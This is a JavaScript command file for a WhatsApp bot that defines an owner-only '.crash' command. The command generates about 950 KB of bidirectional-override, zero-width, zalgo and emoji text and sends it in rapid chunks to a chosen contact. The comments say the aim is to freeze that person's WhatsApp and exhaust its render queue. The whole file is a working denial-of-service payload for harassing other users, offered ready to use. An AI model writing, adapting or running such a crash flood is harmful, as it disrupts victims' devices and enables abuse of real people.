// commands/crash.js
// .crash [@mention | reply | number]
// Owner only. Sends a heavy ASCII flood message that freezes the target's WhatsApp for a bit.
import { PREFIX } from '../lib/config.js';
import { say } from '../lib/card.js';

const CHUNK = 4096;

// Builds ~1 MB of Unicode/zero-width/RTL/combining-character soup
function buildCrashText() {
  const zwj      = '‍';
  const rtl      = '‮';
  const ltr      = '‬';
  const zwnj     = '‌';
  const combining = '̴̀́̂̃̈̊͟';
  const bigEmoji  = '😂🔥💀🎉🤯😈👀💣⚡🌊🦋🎸🏆🧨';
  const zalgo     = (c) => c + [...combining].map((x) => x.repeat(8)).join('');

  let base = '';
  // RTL override + zalgo ASCII block
  for (let i = 0; i < 300; i++) {
    base += rtl + zalgo(String.fromCharCode(65 + (i % 26))) + ltr + zwj + zwnj;
  }
  // Emoji ZWJ chain
  for (let i = 0; i < 200; i++) {
    base += bigEmoji[i % bigEmoji.length] + zwj + bigEmoji[(i + 3) % bigEmoji.length] + zwj;
  }
  // Deep combining override spam
  for (let i = 0; i < 400; i++) {
    base += '​' + '̀'.repeat(50) + '́'.repeat(50) + '̂'.repeat(50);
  }
  // RTL / bidi spam
  for (let i = 0; i < 200; i++) {
    base += '‫‪‏‎' + 'A'.repeat(20) + '‬‭';
  }
  // Repeat to target ~900 KB so it hits render limits
  while (base.length < 900 * 1024) base += base.slice(0, 50000);
  return base.slice(0, 950 * 1024);
}

const CRASH_TEXT = buildCrashText(); // built once at startup

export default [
  {
    name: 'crash', owner: true, react: '💀',
    async run({ sock, msg, jid, reply, targetJid }) {
      const target = targetJid() || jid;

      await reply('💀 sending...');

      // Split into WhatsApp-safe chunks (max ~65535 bytes per message)
      // Sending several chunks back-to-back maxes out the render queue
      const chunks = [];
      for (let i = 0; i < CRASH_TEXT.length; i += CHUNK) {
        chunks.push(CRASH_TEXT.slice(i, i + CHUNK));
      }

      // Fire all chunks with a tiny gap so WA doesn't drop them
      for (const chunk of chunks) {
        try {
          await sock.sendMessage(target, { text: chunk });
        } catch { /* ignore individual send failures */ }
        await new Promise((r) => setTimeout(r, 80));
      }

      return reply(`✅ sent ${chunks.length} chunks to ${target.split('@')[0]}`);
    },
  },
];
